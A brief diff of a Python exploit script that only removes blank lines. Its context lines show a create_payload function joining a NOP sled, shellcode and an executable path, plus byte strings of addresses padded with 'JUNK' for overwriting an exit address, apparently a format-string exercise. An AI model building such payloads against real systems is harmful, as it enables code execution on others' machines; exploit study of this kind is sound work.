@@ -50,8 +50,6 @@ def create_payload():
     return noops + shellcode + executable_path
 
 
-
-
 # Here we're creating string which will right DWORD in our exit address
 w1 = b'\xe0\x97\x04\x08' + b'JUNK'
 w2 = b'\xe1\x97\x04\x08' + b'JUNK'
